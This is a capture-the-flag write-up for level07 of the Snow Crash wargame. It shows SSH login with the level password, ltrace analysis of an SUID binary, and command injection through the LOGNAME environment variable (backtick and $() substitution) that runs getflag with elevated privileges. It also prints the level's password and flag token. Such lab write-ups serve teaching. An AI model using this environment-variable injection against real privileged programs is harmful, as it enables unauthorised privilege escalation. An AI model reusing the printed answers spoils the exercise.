### TLTR;
```shell
┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level07
level07@192.168.1.64's password: wiok45aaoguiboiki2tuin6ub
level07@SnowCrash:~$ export LOGNAME="\`getflag\`"
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
***

Login as `level07`.
```shell
┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level07
level07@192.168.1.64's password: wiok45aaoguiboiki2tuin6ub
```
An `SUID` executable is located in home directory.
```shell
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```
Seems to print executable name `argv[0]`?
```shell
level07@SnowCrash:~$ ./level07
level07
```
Use `ltrace` to intercept dynamic library calls and system calls executed by the program.
```gdb
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid() = 2007
geteuid() = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
getenv("LOGNAME") = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff48, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> ) = 0
+++ exited (status 0) +++
```
Programs calls `getenv()` which searches the environment list to find the environment variable `LOGNAME`.

Change environment variable `LOGNAME` with command substitution by escaping backticks if using with double quotes.
```shell
level07@SnowCrash:~$ export LOGNAME="\`getflag\`"
#level07@SnowCrash:~$ export LOGNAME='`getflag`'
#level07@SnowCrash:~$ export LOGNAME='$(getflag)'
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
